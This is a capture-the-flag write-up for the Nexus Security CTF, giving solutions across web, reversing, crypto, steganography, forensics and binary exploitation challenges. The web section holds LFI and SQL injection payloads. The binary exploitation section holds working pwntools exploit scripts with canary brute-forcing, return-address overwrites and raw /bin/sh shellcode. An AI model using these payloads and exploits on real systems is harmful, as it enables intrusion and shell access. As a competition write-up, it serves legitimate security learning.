# NexusSecurity-CTF-Writeup ~ Team an0nym0u5

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/72a7c511-6783-4c1c-b368-30eef05aeec5)


## Misc Challenges

### 1. Feedback
#### Approach :
Got the flag after submitting the feedback form given by the organisers

### 2. Sanity Check
#### Approach :
Browsed the "announcements" channel in the discord server and found the hidden flag

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/65342d37-6a03-47f6-bfde-4350a2f8af57)


### 3. Welcome Flag
#### Approach :
The flag was explicitly given in the challenge description

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/72aa27bf-669f-446a-90ee-fb864dd2367d)


### 4. Dits and Dahs
#### Approach :
We were given a .wav file which was a morse code audio file. Upon uploading the file in morse code decoder like ![https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) we would get the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/e5846ed8-e636-402e-972c-66d7446405ab)


### 5. Escape
#### Approach 1:
We were given a python script which had the `supers3cr3t = 'NexusCTF{REDACTED}'` in the script. So we must add a breakpoint in the remote instance to spawn a python debugger in which we could read the actual content of the file from the instance.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/419ac538-6394-400f-b29f-f89b21dc33a6)

#### Approach 2:
Just Write `globals()` when you are prompted!

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/9ef95d2a-9d28-42f2-87a0-3cf6d4a169e2)


### 6. Home Sweet Home
#### Approach :
Web Challenge... In this after exploiting many possible directories I found that the url ![](http://chall.ycfteam.in:5252/.bash_history) is accessible. 

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/a943c828-5d45-44cc-8075-173514333d70)

In this bash_history we could see that the admin has some text file `for-admin-message.txt`. Upon visiting the url http://chall.ycfteam.in:5252/.for-admin-message.txt , we could see a note 

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/09809076-1ff2-4290-895f-275859601f39)

This note finally hinted that there is a directory called `.adm1n`. Hence I proceeded to visit it and found the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/28979843-8ecd-4b02-b6c6-2830aeb5f5c2)

<br>

## Web Security Challenges<br>

### 1. Nerd Robot
#### Approach :
This was a easy challenge.. Going to /robots.txt revealed the text `/flagdownthere`. Then by simply scrolling the page down till the end I got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/6f159395-332e-425c-8597-c9769219ceaa)


![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/99722d9d-6519-42dd-b8c6-d951d4a89d0c)



### 2. The Loquacious Locksmith
#### Approach :
I overflowed both the input fields with `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` and got the flag..

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/2d9e797e-21e9-4409-95f1-876995786291)


### 3. Model Selector
#### Approach :
Inspecting the sourse code of the landing page gave a clue (include `?src` in the url) for seeing how the flag is been held in the server.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/49691677-4834-48b4-af12-d4291326afa4)

upon viewing the source, we could see this..

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/e2ae0e37-de33-45b1-a386-4600aff07c5b)

So this is basically a LFI challenge. After trying various payloads in the url I finally manage to get the right combinetion which revealed a text.

Payload - `http://chall.ycfteam.in:9050/?secretView=http:://webctf.com/..//..//images/..//..//..//..//flag.txt`

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/12096975-88ad-4aaf-bdce-05564356c0e2)


Upon decrypting the text with CyberChef I got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/aac7d985-e9f9-4cc0-b476-87755c683be2)


### 4. Santa Claus
#### Approach :
This is a SQL Injection based Problem. Upon viewing the source code for the page we could see there is a `forgotpasswd.php` file.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/1163074c-e832-4651-bfed-0372a70c4d3a)

After opening it and inspecting the code it gave the clue..

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/7c433b4d-3100-4ec7-9fe3-de6ab870ca64)


This hinted us to craft a unique payload ti inject in the forgot password page.. Hence After researching and googling and trial and errors, I came up with this payload `' ^ '` which i injected in the page and it worked successfully.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/1bd47885-46e5-43d1-be2d-9ea69ce5d381)

Then I captured the response using Burpsuite, which gave me the password for the account.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/c4111bb1-3c33-44d9-84c1-fc4aebbf78dd)

It was a base64 encoded string which when decrypted using CyebrChef revealed the password

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/25ecff68-e540-445a-800f-876ea06fd3f7)

After getting the Username and Password I logged in to the site with `jollymachenderson123` & `youarenevergonnafindoutmysup3rs3cr3tpassw0rdasitsjustw@ytooolongg` which gave the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/5efaa661-63c5-45e6-bcc9-66268dbda125)


## OSINT Challenges

### 1. Vital Information Resources under Siege
#### Approach :
Googling the first ever computer virus gave the answer as `Brain` and some sites gave the response as `Creeper`. Upon trying both of them I found that the actual ans was "Brain"

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/7d10064a-aad1-4436-91b2-4bbcc0d3cc3f)


### 2. Announcement
#### Approach :
The first announcement in the discord channel revealed a linked in url ![https://www.linkedin.com/posts/ycfteam_nexuselitesctf-cybersecurity-ctf-activity-7180088177615888384-XWwg/](https://www.linkedin.com/posts/ycfteam_nexuselitesctf-cybersecurity-ctf-activity-7180088177615888384-XWwg/) .Upon visiting this link, I found the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/06bafcff-fbbd-4870-a499-fba7fe46fe39)


### 3. The Infamous Project
#### Approach :
Upon searching the text given in the discription in Microsoft-Copilot with more precise model revealed the name of the legislative Council as `Geoge Cary`. Which is the reuired flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/533b2c75-5dcf-4178-962b-d41d7027dc8f)


### 4. Jeffery
#### Approach :
Googling for Jeffery_555 resulted in a reddit link. Upon Checking it with the `waybackmachine` I got a drive link.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/8cc92d87-c0f3-4e9f-ad09-0440461e4e14)

Upon visiting the drive link I could see a song's lyrics and other hints. I searched for the song using the lyrics and found that this is a song in the series `The Stranger Things`. The amin character in this series is "Millie Bobby Brown". Searching for her debut film and it's release year, I got the flag.

<br>

## Reverse Engineering Challenges

### 1. Starting Point
#### Approach :
Seeing the printable contents in the file via `strings <filename>` I saw that the file is packed with "upx"

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/8f99c3d1-773d-4e66-b2f0-39258801c2aa)

So i unpaced the file with the command `upx -d <filename>`

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/65c279d8-8b83-4aea-b793-500cb2882b5e)

After which I inspected the file using `gdb` debugger and found that the required data is being stored as hex.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/bbcbe6eb-8be1-4cff-8b67-d98d83a39dca)

Thus by collecting the hexs and resolving it with a simple python script revealed the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/1b0131d1-bc42-4ce6-96c3-9ca1c28ff2a3)


### 2. Baby Elf 01
#### Approach :
Upon inspecting the given file using Ghidra and Binary Ninja, I found that we need a number satisfying all the conditions. So i wrote a simple c program to generate the number
#include <stdio.h>
```
int rock() {
    int var_14 = 0;
    for (int i = 0; i <= 10; i++) {
        var_14 += i;
        if (var_14 > 9) {
            for (int j = 0; j <= 30; j++) {
                var_14 += j;
                if (j % 2 == 0) {
                    if (((j + var_14) + 0xdda7a) & 1) {
                        var_14 = ((j + var_14) + 0xdda7a) + j;
                    } else {
                        var_14 = j + ((j + var_14) + 0xdda7a) + 0x6681a0;
                    }
                }
            }
        }
    }
    return var_14;
}

int main() {
    printf("Required input: %d\n", rock());
    return 0;
}
```
Thus by executing the file and passing the obtained number, I got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/b5f17186-5bd6-4322-98c2-4840deefd847)


### 3. MockingBird
#### Approach :
For this challenge u need to install a debugger tool called `pwndbg` from github. On debugging the file with the tool, I setted the break point in the generate function using `b Generate` command and stepped the execution using `s 200` command. On each step we could see the flag getting pushed into the stack. After few steps I got the entire flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/9a6d6e1a-46f7-4817-93fd-2c3bc74f198d)


### 4. Baby Elf 02
#### Approach :
This is a simple input overflow problem. Just spawn the instance given `nc chall.ycfteam.in 8888` and type `a` as input, I got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/02f5be03-9a7d-45f1-8478-a38ec93c79ed)


<br>

## Cryptography Challenges

### 1. 2^4=?
#### Approach :
2 ^ 4 = 16. This hinted "Hexadecimal". So I splitted the given cipher text into 16 length substrings and selected the last digit of each substring and decoded it from hex repeatedly to get the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/e0bcb5ad-a1a0-4344-9974-895a5c9919c8)

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/d65d977e-1d84-464a-a7a3-006e884e591f)


### 2. RAS
#### Approach :
In this problem we are given a python script 
```
from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes
from string import ascii_letters, digits
from random import choice

wisdom = "".join(choice(ascii_letters + digits) for _ in range(16))
passion = getPrime(128)
ambition = getPrime(128)
desire = passion * ambition
willpower = 65537
fate = inverse(willpower, (passion - 1) * (ambition - 1))

insight = pow(bytes_to_long(wisdom.encode()), willpower, desire)

print(f"{insight = }")
print(f"{fate = }")


print("Virtue:")
virtue = input("> ").strip()

if virtue == wisdom:
    print("Victory
  !
  !")
    with open("/challenge/flag.txt") as f:
        print(f.read())
else:
    print("Defeat
  !")                                                                                                                    
```

According to this script we are required to find the value of the wisdom. So I wrote a script to find the prime factors of `p * q` and factorise the value `d * 65537`. If the value matches the virtue in the instance, we will get the flag.
#### CODE:
```
from pwn import *
import primefac
from itertools import combinations
from Crypto.Util.number import long_to_bytes

def sub_lists (l):
    comb = []

    #Iterating till length of list
    for i in range(1,len(l)+1):

        comb += [list(j) for j in combinations(l, i)]

    return comb

def divisors(phi):
   print("Give me the divisors of ", phi-1)

   return(eval(input()))

r = remote('chall.ycfteam.in', 21720)

r.recvuntil("insight =")
ciphertext=int(r.recvline())

r.recvuntil("fate =")
d=int(r.recvline())
print("cipher=",ciphertext)
print("d=",d)
print(r.recvuntil("Virtue:"))
r.recvline()

factors=divisors(d*65537)
combos = sub_lists(factors)
primes = set()

for l in combos:
   product = 1
   
   for k in l:
      product = product * k

   if product.bit_length()==128 and primefac.isprime(product+1):
      primes.add(product+1)
print(primes)
primelist = list(primes)

for p in primelist:
   for q in primelist:
      n=p*q

      plain = pow(ciphertext,d,n)
      try:
         plaintext = long_to_bytes(plain)

         print(plaintext.decode())
         r.sendline(plaintext.decode())
         print(r.recvline())
         print(r.recvline())
         print(r.recvline())
      except:
         continue
```
After running this script we need to pass the prime factors of the number being prompted.. I did this using ![https://www.dcode.fr/prime-factors-decomposition](https://www.dcode.fr/prime-factors-decomposition)

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/9ecca9c6-63e7-4952-abfc-44601b17097b)

I passed the factors as a list and got the flag..

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/3a111ec1-2446-4238-aae7-f52923e4a6b1)



### 3. Xtreamly ORbital
#### Approach :
Upon seing the question we could easily see that this is an `XOR` based question. On seeing the given files `flag.ycg.enc` and `key.ycf` we sould easily say that the `flag.ycg.enc` file has been encrypted with the `key.ycf` file. Thus i could easily decode this with this simple python script..

```
import hashlib

# Read the contents of the key file
with open('key.ycf', 'r') as key_file:
    key_content = key_file.read().encode()

# Calculate the SHA256 hash of the key content
key_hash = hashlib.sha256(key_content).digest()

# Read the encrypted file
with open('flag.ycf.enc', 'rb') as encrypted_file:
    encrypted_data = encrypted_file.read()

# Decrypt the encrypted data using the SHA256 hash as the key
decrypted_data = bytearray()
for i in range(len(encrypted_data)):
    decrypted_data.append(encrypted_data[i] ^ key_hash[i % len(key_hash)])
print(decrypted_data)
```

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/4aefa1c0-857e-4ee8-9219-ef3db0b2b5ef)

<br>

## Stegno Challenges

### 1. You Can't See Me
#### Approach :
I solved this using `steghide` I got the passphrase by using the "strings" command..

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/eeda550a-b195-4a18-a820-2376906074f6)

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/2464ef34-1374-4889-a072-ca3fa32d9cca)


### 2. Zero Hidden Knight in Space
#### Approach :
This is a challenge involving zero width charcters. So by passing the stego text in this tool ![https://330k.github.io/misc_tools/unicode_steganography.html](https://330k.github.io/misc_tools/unicode_steganography.html), I got a drive link which had the flag in a glitched format.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/dade1520-2c83-4dda-877d-a3c34cbfecbf)


### 3. Insignificant?
#### Approach :
This problem is a LSB problem. I solved this using `stego-lsb` a python library. I found the payload needed to be passed with the function using Ghidra found the address as `5589`. Hence I passed this into my file and got the flag. 

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/7f079a70-fb1f-4916-b999-db5fe8e27107)


### 4. The C.S Dictionary
#### Approach :
This is a problem in "White Space Stegonography". I conevrted all the `tabs` and `spaces` to `0s` and `1s` respectively and took only the binary stream of data. Then I converted it from Binary to ASCII and got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/d4312f84-4f14-4d79-b3cb-92d0517522bb)


### 5. Blind
#### Approach :
In this challenge we are given an image of terminal which had the falg info cut at the bottom. Thus by increasing the height of the image in `hexeditor` i got the flag.

#### Given img

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/97cce556-4be1-49c7-a3e1-e00a2a47c5ae)

#### Hexeditor 

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/5400a11a-ca3f-4b7b-b25b-d43102886caf)

We can see that `03 5A` in address `100` corresponds to image height. Change it to `04 5A` to increase the height of the image.

#### Image after increasing height

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/34871642-b837-4205-b787-4a18ee68602a)

<br>

## Forensics Challenges

### 1. Echos Parody
#### Approach :
In this problem we are given a .pcap file whichc when opened in wireshark gave enormous number of "Echo" statements. Thus by folowing all the necessary echos I got the string `TmV4dXNDVEZ7QzBsbDNjdF9UaDNtXzRsbCEhfQ==`. Then I decoded it with CyberChef and got the flag..

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/a6775757-cfd6-42c7-9754-3ae7256cf52b)

### 2. Arecibo 
#### Approach :
In this problem we are given an audio file which is an `sstv` message.. So I used this tool ![https://github.com/colaclanth/sstv](https://github.com/colaclanth/sstv) to solve this challenge.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/8e5984c9-2528-448a-8c98-0139ac85a0a5)

We could see that the tool has writtern the output.png file. I opened it and got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/2455f9d8-dc9e-42cd-baac-3d416085243e)


<br>

## Binary Exploitation

### 1. DEADFOOD
#### Approach :
For this challenge I analysed the given file in Binary Ninja decompiler and realised that this requires a payload that overflows it's buffer and rewards us with a shell. 

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/44c1c492-6ab6-431e-9275-79920a97251a)

So i crafted a payload which dumps many 'A's into the memory buffer along with the `Little Endian` sequence to overwrite the buffered values with the long sequence of 'A's.

Payload : `python2 -c 'print "A"*264 + "\xee\xff\xc0\x00" + "\xfe\xca\x00\x00" ';cat`

Now I just piped it with the given remote instance which rewarded me with a shell. Then I just listed the files in the directory using `ls` command and found a `flag.txt` file. I just viewed the contents using `cat` command and got the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/dfa3a916-ff38-4f80-b41c-acaa631219fb)


### 2. The Guard
#### Approach :
According to the ELF file we need to find a sequence of canary value / code to get the shell . So I wrote a python script to exploit the ELF file ..

#### Exploit Code:
```
from pwn import *

chars = '0123456789ABCDEF'

context.binary = binary = ELF("./challenge")

#p = process()
ip = input("IP >> ")
port = input("PORT >> ")
p = remote(ip,port)
ask_quest = p.recvline()
print(ask_quest)
reply = b'y'
p.sendline(reply)

p.recvline()

canary_line = p.recvline()[:-1].decode()
print(canary_line)
leaked_canary = canary_line.split(": ")[1]
print(f'leaked canary is {leaked_canary}')
num=0
good = 0
original_canary = None
for i in chars:
        for j in chars:
                for k in chars:
                        input_ = p.recvline()
                        print(input_)
                        if b'Awesome' in input_:
                                original_canary = payload.decode()
                                good = 1
                                break
                        num += 1
                        payload = leaked_canary.encode() + i.encode() + j.encode() + k.encode()
                        print(payload)
                        p.sendline(payload)
                        reply = p.recvline()
                        print(reply)
                if good:
                        break
        if good:
                break
print(f'original Canary = {original_canary}')
print(p.recv())
p.sendline(b'A'*88 + p64(0x0000000000401016) + p64(0x4011b6))
p.interactive()
```
In this script Bruteforced all possible combinations to find out the correct canary value that matches with the leaked one. Once the correct canary value is obtained I just filled all the buffer values with 'A's until the return address via payload. On receiving the payload, the vulnerable program overflows the buffer rewarding the shell.

Passing the IP and port of the remote instance:

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/7553ab30-3089-4b9b-bb58-319dcbcebacc)

Getting the canary value and reward:

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/f5e84671-ff8d-40c6-b0c2-bd4c3f7f87d9)


### 3. Kosandra
#### Approach :
Initially I prepared shellcode, which is the assembly code that spawns a shell when executed. In this case, the shellcode I is a standard x86_64 Linux shellcode. The binary file provides an address as part of its interaction. This address will be used as the target address for the return-oriented programming (ROP) chain. So I wrote an exploit script that retrieves this address and converts it to an integer. I crafted the payload by concatenating the shellcode with a padding of 'A's to fill the buffer until it reaches the return address. The return address is overwritten with the leaked address obtained from the ELF file.

#### Exploit Code:
```
from pwn import *

context.binary = binary = ELF("./kosandra")

shell_code = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

ip = input("IP >> ")
port = input("Port >> ")

p = remote(ip,port)

p.recvuntil('Tell The World That How Much You Love Me............! ')

add = int(p.recvline().strip(), 16)
print(f"Address = {add}")

payload = shell_code + b'A'*(56 - 23) + p64(add)

p.sendline(payload)
p.interactive()
```

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/5d7c6965-5cf2-4388-9b4e-9f0860de382e)


### 4. Freedom
#### Approach :
On viewing the file in Binary Ninja, I found that the binary executes whatever we give as input as a shellcode. It also has a very large buffer. So I wrote a simple python script to exploit it..

#### Exploit Script :
```
from pwn import *

context.arch='amd64'

ip= input("IP>> ")
port=input("PORT >> ")

p = remote(ip,port)
elf = ELF("main")


shellcode = shellcraft.amd64.linux.sh()
binary_shellcode = asm(shellcode)

p.recv()
p.sendline(binary_shellcode)
p.interactive()

```
Upon running this script on the given instance ` nc chall.ycfteam.in 6666`, I got the shell. Further I listed the files using the `ls` command and open the contents of the "flag.txt" file using `cat` comand to reveal the flag.

![image](https://github.com/Siva-PythonPirates/Nexus-Security-CTF-Writeup/assets/79368311/d6ca420d-6e21-4d17-a3ed-2a87e2d0705e)
